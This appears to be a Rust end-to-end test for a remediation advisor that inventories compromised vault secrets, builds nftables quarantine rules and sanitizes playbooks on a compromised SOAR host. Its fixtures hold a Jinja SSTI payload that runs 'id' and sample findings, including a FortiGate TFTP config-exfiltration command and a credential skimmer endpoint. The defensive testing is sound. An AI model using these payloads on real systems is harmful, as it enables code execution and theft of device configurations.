use std::fs;
use std::path::PathBuf;
use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};

use fsr_deep_audit::crypto::sha256_hex;
use fsr_remediation_advisor::{
    emit_remediation_plan, generate_remediation_plan, RemediationAdvisorConfig,
    RemediationOutputFormat,
};

fn unique_temp_dir(prefix: &str) -> PathBuf {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    std::env::temp_dir().join(format!("{}_{}_{}", prefix, std::process::id(), nanos))
}

#[test]
fn end_to_end_remediation_plan_vault_containment_playbook_migration_and_formats() {
    let root = unique_temp_dir("fsr_remediation_e2e");
    let conn_base = root.join("opt/cyops-integrations/integrations/connectors");
    let wf_base = root.join("opt/cyops-workflow/collections");
    let nginx_base = root.join("etc/nginx/conf.d");
    fs::create_dir_all(&conn_base).unwrap();
    fs::create_dir_all(&wf_base).unwrap();
    fs::create_dir_all(&nginx_base).unwrap();

    // 1. Populate 5 Enterprise Connectors (Active Directory, CrowdStrike, FortiGate, Splunk, Exchange)
    //    with decoy secret values to prove strict metadata-only scanning!
    let forbidden_secret = "NEVER_READ_THIS_ENTERPRISE_PASSWORD_42!";
    for (dir_name, name, label) in [
        ("active-directory_3_2_0", "active-directory", "Microsoft Active Directory"),
        ("crowdstrike_2_1_0", "crowdstrike", "CrowdStrike Falcon"),
        ("fortigate-firewall_4_0_0", "fortigate-firewall", "FortiGate Firewall"),
        ("splunk_3_1_0", "splunk", "Splunk Enterprise"),
        ("exchange_4_2_0", "exchange", "Microsoft Exchange"),
    ] {
        let cdir = conn_base.join(dir_name);
        fs::create_dir_all(&cdir).unwrap();
        fs::write(
            cdir.join("info.json"),
            format!(
                r#"{{
                  "name": "{name}",
                  "label": "{label}",
                  "version": "1.0.0",
                  "publisher": "Fortinet",
                  "configuration": {{
                    "fields": [
                      {{"name": "server_url", "title": "Server URL", "type": "text"}},
                      {{"name": "api_secret", "title": "API Secret", "type": "password", "default": "{forbidden_secret}"}}
                    ]
                  }}
                }}"#
            ),
        )
        .unwrap();
    }

    // 2. Nginx shadow mirror upstream config so `containment_commands` resolves the mirror target IP:port
    fs::write(
        nginx_base.join("shadow.conf"),
        "location = /_shadow_tap {\n    internal;\n    proxy_pass http://198.51.100.177:9443;\n}\n",
    )
    .unwrap();

    // 3. Populate 2 Clean SOC Playbooks and 2 Injected/Tainted Playbooks
    let clean_phishing = r#"{
      "type": "workflow_collections",
      "data": [{
        "@type": "WorkflowCollection",
        "name": "SOC Core Triage",
        "workflows": [
          {
            "@type": "Workflow",
            "name": "Phishing Header Analysis",
            "steps": [
              {"name": "Extract Domains", "connector": "utilities", "arguments": {"input": "{{ vars.email_body }}"}},
              {"name": "Search SIEM", "connector": "splunk", "arguments": {"query": "index=mail sender={{ vars.sender }}"}}
            ]
          }
        ]
      }]
    }"#;
    let clean_phishing_sha = sha256_hex(clean_phishing.as_bytes());
    fs::write(wf_base.join("clean_phishing_triage.json"), clean_phishing).unwrap();

    let injected_jinja = r#"{
      "@type": "Workflow",
      "name": "Compromised Enrichment",
      "steps": [
        {
          "name": "Hidden SSTI Backdoor",
          "arguments": {"template": "{{ cycler.__init__.__globals__.os.popen('id').read() }}"}
        }
      ]
    }"#;
    fs::write(wf_base.join("compromised_enrichment.json"), injected_jinja).unwrap();

    let tainted_conn_pb = r#"{
      "@type": "Workflow",
      "name": "EDR Auto Isolate",
      "steps": [
        {
          "name": "Isolate Endpoint",
          "connector": "crowdstrike",
          "arguments": {"host_id": "{{ vars.host_id }}"}
        }
      ]
    }"#;
    fs::write(wf_base.join("tainted_edr_workflow.json"), tainted_conn_pb).unwrap();

    // 4. Write a synthetic sealed `ForensicVerdictBundle` JSON referencing `root`
    let bundle_path = root.join("forensic_bundle.json");
    let bundle_json = format!(
        r#"{{
          "schema_version": "1.0.0",
          "scan_context": {{
            "root_path": "{}",
            "hostname": "compromised-soar-01"
          }},
          "verdict": {{
            "status": "COMPROMISED",
            "composite_risk_score": 100,
            "total_findings": 7
          }},
          "merkle_envelope": {{
            "merkle_root_hex": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
          }},
          "findings": [
            {{
              "code": "CRITICAL_SHARED_SOAR_VAULT_MASTER_KEY",
              "severity": "CRITICAL",
              "target": "soar_vault_hmac:deadbeef",
              "detail": "Cloned SECRET_KEY across 2 institutions"
            }},
            {{
              "code": "CRITICAL_CONNECTOR_CREDENTIAL_SKIMMER",
              "severity": "CRITICAL",
              "target": "/opt/cyops-integrations/integrations/connectors/crowdstrike_2_1_0/operations.py",
              "detail": "Exfiltrates config to https://198.51.100.88:8443/collect",
              "evidence": {{"connector": "crowdstrike", "sink": "https://198.51.100.88:8443/collect"}}
            }},
            {{
              "code": "CRITICAL_STATIC_DNS_FORTIGUARD_HIJACK",
              "severity": "CRITICAL",
              "target": "/etc/hosts",
              "detail": "Redirects update.fortiguard.net to 10.254.254.10"
            }},
            {{
              "code": "CRITICAL_NGINX_TRAFFIC_MIRROR_OR_BYPASS",
              "severity": "CRITICAL",
              "target": "/etc/nginx/nginx.conf",
              "detail": "Nginx traffic mirror /_shadow_tap duplicating API requests",
              "evidence": {{"directive_argument": "/_shadow_tap"}}
            }},
            {{
              "code": "CRITICAL_ELF_TEXT_INLINE_PATCH",
              "severity": "CRITICAL",
              "target": "/proc/4242/mem",
              "detail": "Inline patch in uwsgi",
              "evidence": {{"pid": 4242}}
            }},
            {{
              "code": "CRITICAL_PG_HBA_TRUST_BACKDOOR",
              "severity": "CRITICAL",
              "target": "/var/lib/pgsql/16/data/pg_hba.conf",
              "detail": "0.0.0.0/0 trust"
            }},
            {{
              "code": "CRITICAL_FGT_AUTOMATION_EXFIL_BACKDOOR",
              "severity": "CRITICAL",
              "target": "fgt.conf:auto-script:exfil_cfg",
              "detail": "execute backup full-config tftp dump.conf 198.51.100.220"
            }}
          ]
        }}"#,
        root.display()
    );
    fs::write(&bundle_path, &bundle_json).unwrap();

    let plan = generate_remediation_plan(&RemediationAdvisorConfig {
        bundle_path: Some(bundle_path.clone()),
        ..Default::default()
    })
    .expect("remediation plan generation should succeed");

    // Verify Module 1: Compromised Vault Inventory
    assert!(plan.compromised_vault_inventory.emergency_rotation_required);
    assert_eq!(plan.compromised_vault_inventory.secrets_read_count, 0);
    assert_eq!(
        plan.compromised_vault_inventory.emergency_revocation_list.len(),
        5
    );
    assert_eq!(
        plan.compromised_vault_inventory.emergency_revocation_list[0].connector_id,
        "crowdstrike"
    );
    assert!(plan.compromised_vault_inventory.emergency_revocation_list[0].actively_skimmed);

    // Verify Module 2: Non-Destructive Containment & Volatile Preservation
    assert!(plan.containment_commands.containment_required);
    assert_eq!(plan.containment_commands.compromised_pids, vec![4242]);
    let quarantined_ips: Vec<String> = plan
        .containment_commands
        .hostile_endpoints
        .iter()
        .map(|e| e.ipv4.to_string())
        .collect();
    assert!(quarantined_ips.contains(&"198.51.100.88".to_string())); // Skimmer C2
    assert!(quarantined_ips.contains(&"10.254.254.10".to_string())); // Fake FDN
    assert!(quarantined_ips.contains(&"198.51.100.177".to_string())); // Nginx mirror upstream
    assert!(quarantined_ips.contains(&"198.51.100.220".to_string())); // FortiOS TFTP exfil
    assert!(plan
        .containment_commands
        .nftables_quarantine_script
        .contains("198.51.100.177"));

    // Verify Module 3: Clean Playbook Migration Sanitizer & SHA-256 Manifest
    assert_eq!(plan.clean_migration_plan.total_playbook_files_inspected, 3);
    assert_eq!(plan.clean_migration_plan.approved_clean_count, 1);
    assert_eq!(plan.clean_migration_plan.quarantined_count, 2);
    assert!(plan
        .clean_migration_plan
        .sha256sum_manifest_text
        .contains(&clean_phishing_sha));

    // Verify JSON, Markdown & HTML outputs contain ZERO leaked secrets
    let json_out = emit_remediation_plan(&plan, RemediationOutputFormat::Json, true);
    let md_out = emit_remediation_plan(&plan, RemediationOutputFormat::Markdown, true);
    let html_out = emit_remediation_plan(&plan, RemediationOutputFormat::Html, true);
    assert!(!json_out.contains(forbidden_secret));
    assert!(!md_out.contains(forbidden_secret));
    assert!(!html_out.contains(forbidden_secret));
    assert!(md_out.contains("nftables"));
    assert!(html_out.contains("<!DOCTYPE html>"));

    // Verify standalone CLI binary `fsr-remediation-advisor`
    let advisor_bin = env!("CARGO_BIN_EXE_fsr-remediation-advisor");
    let cli_out = Command::new(advisor_bin)
        .arg("--bundle")
        .arg(&bundle_path)
        .arg("--format")
        .arg("markdown")
        .output()
        .expect("failed to run fsr-remediation-advisor CLI");
    assert!(cli_out.status.success());
    let cli_md = String::from_utf8_lossy(&cli_out.stdout);
    assert!(cli_md.contains(&clean_phishing_sha));
    assert!(cli_md.contains("CrowdStrike Falcon"));

    let _ = fs::remove_dir_all(&root);
}
